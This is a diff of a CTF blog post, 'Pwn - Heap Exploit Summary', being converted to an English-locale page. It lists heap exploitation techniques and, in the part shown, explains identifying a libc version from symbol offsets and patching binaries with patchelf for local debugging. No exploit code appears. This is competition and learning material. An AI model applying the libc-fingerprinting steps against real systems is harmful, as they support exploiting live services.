@@ -1,33 +1,33 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Pwn - Heap Exploit Summary | HeyGap's_Blog</title><meta name="author" content="HeyGap"><meta name="copyright" content="HeyGap"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="总结一下 Heap 的相关内容，便于后续调用">
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Pwn - Heap Exploit Summary | HeyGap's_Blog</title><meta name="author" content="HeyGap"><meta name="copyright" content="HeyGap"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="总结一下 Heap 的相关内容，便于后续调用">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Pwn - Heap Exploit Summary">
-<meta property="og:url" content="http://heygap.github.io/posts/56319.html">
+<meta property="og:url" content="http://heygap.github.io/en/posts/56319.html">
 <meta property="og:site_name" content="HeyGap&#39;s_Blog">
 <meta property="og:description" content="总结一下 Heap 的相关内容，便于后续调用">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://heygap.github.io/img/cover9.jpg">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://heygap.github.io/en/img/cover5.jpg">
 <meta property="article:published_time" content="2024-02-07T02:54:00.000Z">
 <meta property="article:modified_time" content="2025-02-12T10:09:13.110Z">
 <meta property="article:author" content="HeyGap">
-<meta property="article:tag" content="Heap">
 <meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="Heap">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://heygap.github.io/img/cover9.jpg"><script type="application/ld+json">{
+<meta name="twitter:image" content="http://heygap.github.io/en/img/cover5.jpg"><script type="application/ld+json">{
   "@context": "https://schema.org",
   "@type": "BlogPosting",
   "headline": "Pwn - Heap Exploit Summary",
-  "url": "http://heygap.github.io/posts/56319.html",
-  "image": "http://heygap.github.io/img/cover9.jpg",
+  "url": "http://heygap.github.io/en/posts/56319.html",
+  "image": "http://heygap.github.io/en/img/cover5.jpg",
   "datePublished": "2024-02-07T02:54:00.000Z",
   "dateModified": "2025-02-12T10:09:13.110Z",
   "author": [
     {
       "@type": "Person",
       "name": "HeyGap",
-      "url": "http://heygap.github.io/"
+      "url": "http://heygap.github.io/en/"
     }
   ]
-}</script><link rel="shortcut icon" href="/img/avatar.jpg"><link rel="canonical" href="http://heygap.github.io/posts/56319.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+}</script><link rel="shortcut icon" href="/en/img/avatar.jpg"><link rel="canonical" href="http://heygap.github.io/en/posts/56319.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/en/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
     (() => {
       
     const saveToLocal = {
@@ -118,34 +118,34 @@
   
     })()
   </script><script>const GLOBAL_CONFIG = {
-  root: '/',
+  root: '/en/',
   algolia: undefined,
-  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  localSearch: {"path":"/en/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
   translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"中"},
   highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
   copy: {
-    success: '复制成功',
-    error: '复制失败',
-    noSupport: '浏览器不支持'
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
   },
   relativeDate: {
     homepage: false,
     post: false
   },
-  runtime: '天',
+  runtime: 'days',
   dateSuffix: {
-    just: '刚刚',
-    min: '分钟前',
-    hour: '小时前',
-    day: '天前',
-    month: '个月前'
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
   },
   copyright: undefined,
   lightbox: 'null',
-  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
+  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
   infinitegrid: {
     js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
-    buttonText: '加载更多'
+    buttonText: 'Load More'
   },
   isPhotoFigcaption: false,
   islazyloadPlugin: false,
@@ -160,7 +160,7 @@
   isHighlightShrink: true,
   isToc: true,
   pageType: 'post'
-}</script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+}</script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
   const $loadingBox = document.getElementById('loading-box')
   const $body = document.body
   const preloader = {
@@ -181,420 +181,559 @@
     btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
     btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
   }
-})()</script><div id="web_bg" style="background-image: url(/img/background1.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">34</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">26</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 我的文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/air-conditioner/"><i class="fa-fw anzhiyu-icon-fan"></i><span> 小空调</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-user"></i><span> 关于本人</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover9.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">HeyGap's_Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">Pwn - Heap Exploit Summary</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 我的文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/air-conditioner/"><i class="fa-fw anzhiyu-icon-fan"></i><span> 小空调</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-user"></i><span> 关于本人</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Pwn - Heap Exploit Summary</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-02-07T02:54:00.000Z" title="发表于 2024-02-07 10:02:00">2024-02-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-12T10:09:13.110Z" title="更新于 2025-02-12 18:02:11">2025-02-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF-Theory/">CTF_Theory</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">5.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>22分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><blockquote class="blockquote-center">
+})()</script><div id="web_bg" style="background-image: url(/en/img/background1.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/en/img/avatar.jpg" onerror="this.onerror=null;this.src='/en/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/en/archives/"><div class="headline">Articles</div><div class="length-num">31</div></a><a href="/en/tags/"><div class="headline">Tags</div><div class="length-num">24</div></a><a href="/en/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/en/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 我的文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/en/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/en/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/en/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/en/air-conditioner/"><i class="fa-fw anzhiyu-icon-fan"></i><span> 小空调</span></a></div><div class="menus_item"><a class="site-page" href="/en/about/"><i class="fa-fw fa fa-user"></i><span> 关于本人</span></a></div><div class="menus_item"><a class="site-page" href="/en/"><i class="fa-fw fas fa-home"></i><span> home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> articles</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/en/archives/"><i class="fa-fw fa fa-archive"></i><span> archives</span></a></li><li><a class="site-page child" href="/en/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/en/categories/"><i class="fa-fw fa fa-folder-open"></i><span> categories</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/en/air-conditioner/"><i class="fa-fw anzhiyu-icon-fan"></i><span> air-conditioner</span></a></div><div class="menus_item"><a class="site-page" href="/en/about/"><i class="fa-fw fa fa-user"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover5.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/en/"><span class="site-name">HeyGap's_Blog</span></a><a class="nav-page-title" href="/en/"><span class="site-name">Pwn - Heap Exploit Summary</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/en/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 我的文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/en/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/en/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/en/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/en/air-conditioner/"><i class="fa-fw anzhiyu-icon-fan"></i><span> 小空调</span></a></div><div class="menus_item"><a class="site-page" href="/en/about/"><i class="fa-fw fa fa-user"></i><span> 关于本人</span></a></div><div class="menus_item"><a class="site-page" href="/en/"><i class="fa-fw fas fa-home"></i><span> home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> articles</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/en/archives/"><i class="fa-fw fa fa-archive"></i><span> archives</span></a></li><li><a class="site-page child" href="/en/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/en/categories/"><i class="fa-fw fa fa-folder-open"></i><span> categories</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/en/air-conditioner/"><i class="fa-fw anzhiyu-icon-fan"></i><span> air-conditioner</span></a></div><div class="menus_item"><a class="site-page" href="/en/about/"><i class="fa-fw fa fa-user"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Pwn - Heap Exploit Summary</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-02-07T02:54:00.000Z" title="Created 2024-02-07 10:02:00">2024-02-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-02-12T10:09:13.110Z" title="Updated 2025-02-12 18:02:11">2025-02-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/en/categories/CTF-Theory/">CTF_Theory</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">5.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>22mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><blockquote class="blockquote-center">
 总结一下 Heap 的相关内容，便于后续调用
 </blockquote>
-
 <span id="more"></span>
-<p><a target="_blank" rel="noopener" href="https://github.com/iromise/glibc/tree/master/malloc">Github: ptmalloc 源码(只有 malloc 部分)</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/1a966b62b3d4">source code compilation &amp;&amp; all libc debs</a></p>
-<h1 id="0-目录"><a href="#0-目录" class="headerlink" title="[0] 目录"></a>[0] 目录</h1><ol>
+<p><a target="_blank" rel="noopener" href="https://github.com/iromise/glibc/tree/master/malloc">Github:
+ptmalloc 源码(只有 malloc 部分)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/1a966b62b3d4">source code
+compilation &amp;&amp; all libc debs</a></p>
+<h1 id="目录">[0] 目录</h1>
+<ol type="1">
 <li><a href="#1-patchelf的使用方式">Patchelf的使用方式</a></li>
-<li><a href="#2-详解-申请与释放-chunk未完成">详解 ‘申请与释放 chunk’</a></li>
-<li><a href="#3-chunk-extend-and-overlapping">chunk Extend and Overlapping</a></li>
+<li><a href="#2-详解-申请与释放-chunk未完成">详解 '申请与释放
+chunk'</a></li>
+<li><a href="#3-chunk-extend-and-overlapping">chunk Extend and
+Overlapping</a></li>
 <li><a href="#4-use-after-free">Use After Free</a></li>
 <li><a href="#5-double-free">Double Free</a></li>
 <li><a href="#6-unlink">Unlink</a></li>
-<li><a href="#7-series-of-bin">Series of Bin</a><ul>
+<li><a href="#7-series-of-bin">Series of Bin</a>
+<ul>
 <li><a href="#7-1-tcachebin">7-1 Tcachebin</a></li>
 <li><a href="#7-2-fastbin">7-2 Fastbin</a></li>
 <li><a href="#7-3-unsortedbin">7-3 Unsortedbin</a></li>
 <li><a href="#7-4-largebin-attack">7-4 Largebin Attack</a></li>
-</ul>
-</li>
-<li><a href="#8-series-of-house">Series of House</a><ul>
+</ul></li>
+<li><a href="#8-series-of-house">Series of House</a>
+<ul>
 <li><a href="#8-1-house-of-orange">8-1 House of Orange</a></li>
 <li><a href="#8-2-house-of-force-hof">8-2 House of Force</a></li>
 <li><a href="#8-3-house-of-botcake">8-3 House of botcake</a></li>
 <li><a href="#8-4-house-of-banana">8-4 House of banana</a></li>
 <li><a href="#8-5-house-of-pig">8-5 House of pig</a></li>
-</ul>
-</li>
+</ul></li>
 </ol>
-<h1 id="1-Patchelf的使用方式"><a href="#1-Patchelf的使用方式" class="headerlink" title="[1] Patchelf的使用方式"></a>[1] Patchelf的使用方式</h1><blockquote>
-<p>在本地调试堆题时，不同的 libc 版本会有不同的 heap 管理器来管理 heap，因此我们需要将本地的 elf 文件的链接部分 patch 一下，使其与远程链接的 libc 文件保持一致。</p>
+<h1 id="patchelf的使用方式">[1] Patchelf的使用方式</h1>
+<blockquote>
+<p>在本地调试堆题时，不同的 libc 版本会有不同的 heap 管理器来管理
+heap，因此我们需要将本地的 elf 文件的链接部分 patch
+一下，使其与远程链接的 libc 文件保持一致。</p>
 </blockquote>
-<h2 id="1-1-确认libc"><a href="#1-1-确认libc" class="headerlink" title="[1-1] 确认libc"></a>[1-1] 确认libc</h2><blockquote>
-<p>有时题目只给一个 libc.so.6，此时 patchelf 后程序会因为缺少 ld 文件而无法正常运行，因此我们需要通过这个 libc.so.6 来确认程序使用的 libc 版本，然后自己下载对应 libc 包并 patch</p>
+<h2 id="确认libc">[1-1] 确认libc</h2>
+<blockquote>
+<p>有时题目只给一个 libc.so.6，此时 patchelf 后程序会因为缺少 ld
+文件而无法正常运行，因此我们需要通过这个 libc.so.6 来确认程序使用的 libc
+版本，然后自己下载对应 libc 包并 patch</p>
 </blockquote>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">puts_offset = libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_offset = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">printf_offset = libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_offset      ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(puts_offset))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;read_offset     ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(read_offset))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;printf_offset   ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(printf_offset))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">puts_offset     ---&gt;    0x84420</span></span><br><span class="line"><span class="string">read_offset     ---&gt;    0x10dfc0</span></span><br><span class="line"><span class="string">printf_offset   ---&gt;    0x61c90</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># puts    ---&gt;    420</span></span><br><span class="line"><span class="string"># read    ---&gt;    fc0</span></span><br><span class="line"><span class="string"># printf  ---&gt;    c90</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>将打印出来的三个偏移量的后三位，拿到 <a target="_blank" rel="noopener" href="https://libc.blukat.me/?q=puts%3A420%2Cread%3Afc0%2Cprintf%3Ac90">libcSearcher</a> 去查即可</p>
-<h2 id="1-2-libc-包的下载"><a href="#1-2-libc-包的下载" class="headerlink" title="[1-2] libc 包的下载"></a>[1-2] libc 包的下载</h2><p>patchelf没有的包可以在<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/1a966b62b3d4">这里</a>下载</p>
+<p>将打印出来的三个偏移量的后三位，拿到 <a
+target="_blank" rel="noopener" href="https://libc.blukat.me/?q=puts%3A420%2Cread%3Afc0%2Cprintf%3Ac90">libcSearcher</a>
+去查即可</p>
+<h2 id="libc-包的下载">[1-2] libc 包的下载</h2>
+<p>patchelf没有的包可以在<a
+target="_blank" rel="noopener" href="https://www.jianshu.com/p/1a966b62b3d4">这里</a>下载</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以下操作均在文件夹 glibc-all-in-one 中完成</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看有什么版本的 libc 可以下载</span></span><br><span class="line">./update_list // 更新 list</span><br><span class="line">cat list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载所需要的 libc 包</span></span><br><span class="line">./download 2.35-0ubuntu3_amd64</span><br></pre></td></tr></table></figure>
 <blockquote>
-<p>有时我们需要的 libc 包不在 list 中，我们可以自己尝试解构命令来下载。</p>
+<p>有时我们需要的 libc 包不在 list
+中，我们可以自己尝试解构命令来下载。</p>
 </blockquote>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">访问https://mirror.tuna.tsinghua.edu.cn/ubuntu/pool/main/g/glibc/，查看所有可以下载的 libc 版本</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/ 也可以</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载压缩包(到文件夹glibc-all-in-one/debs)以后用 extract 命令解压缩</span></span><br><span class="line">./extract debs/libc6_2.26-0ubuntu2_i386.deb /tmp/test</span><br></pre></td></tr></table></figure>
-<h2 id="1-3-patch-elf文件"><a href="#1-3-patch-elf文件" class="headerlink" title="[1-3] patch elf文件"></a>[1-3] patch elf文件</h2><blockquote>
-<p>识别需要 patch 的文件<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[path/to/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64]</span><br><span class="line">└─$ ls</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">找到以下文件</span><br><span class="line">ld-linux-x86-64.so.2  # ld-2.23.so 也行</span><br></pre></td></tr></table></figure></p>
+<h2 id="patch-elf文件">[1-3] patch elf文件</h2>
+<blockquote>
+<p>识别需要 patch 的文件 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[path/to/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64]</span><br><span class="line">└─$ ls</span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">找到以下文件</span><br><span class="line">ld-linux-x86-64.so.2  # ld-2.23.so 也行</span><br></pre></td></tr></table></figure></p>
 </blockquote>
-<p>tip1：高版本的libc库没有 <code>ld-2.23.so</code> 这种文件，但它与 <code>ld-linux-x86-64.so.2</code> 等价，都指向相同的动态链接器文件，他们实际上是同一个文件的不同名称。</p>
+<p>tip1：高版本的libc库没有 <code>ld-2.23.so</code> 这种文件，但它与
+<code>ld-linux-x86-64.so.2</code>
+等价，都指向相同的动态链接器文件，他们实际上是同一个文件的不同名称。</p>
 <p>tip2：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被patch的elf文件: Pwn</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置动态链接器 ld.so</span></span><br><span class="line">patchelf --set-interpreter /mnt/e/EdgeDownload/libcTools/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-linux-x86-64.so.2 pwn </span><br><span class="line">patchelf --set-interpreter ./ld-linux-x86-64.so.2 pwn </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置链接库</span> </span><br><span class="line">patchelf --set-rpath  /mnt/e/EdgeDownload/libcTools/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ pwn</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置动态链接器与动态链接库</span></span><br><span class="line">patchelf --set-interpreter /mnt/e/EdgeDownload/libcTools/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/ld-2.23.so --replace-needed libc.so.6 /mnt/e/EdgeDownload/libcTools/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6 pwn</span><br><span class="line">patchelf --set-interpreter ./ld-2.23.so --replace-needed libc.so.6 ./libc.so.6 pwn</span><br></pre></td></tr></table></figure>
-<h2 id="1-4-恢复-debug-symbol"><a href="#1-4-恢复-debug-symbol" class="headerlink" title="[1-4] 恢复 debug symbol"></a>[1-4] 恢复 debug symbol</h2><h3 id="1-4-1-patchelf-list-中有相关包"><a href="#1-4-1-patchelf-list-中有相关包" class="headerlink" title="[1-4-1] patchelf list 中有相关包"></a>[1-4-1] patchelf list 中有相关包</h3><blockquote>
+<h2 id="恢复-debug-symbol">[1-4] 恢复 debug symbol</h2>
+<h3 id="patchelf-list-中有相关包">[1-4-1] patchelf list 中有相关包</h3>
+<blockquote>
 <p>其实没有相关包的话用最近版本的 libc 也能.debug</p>
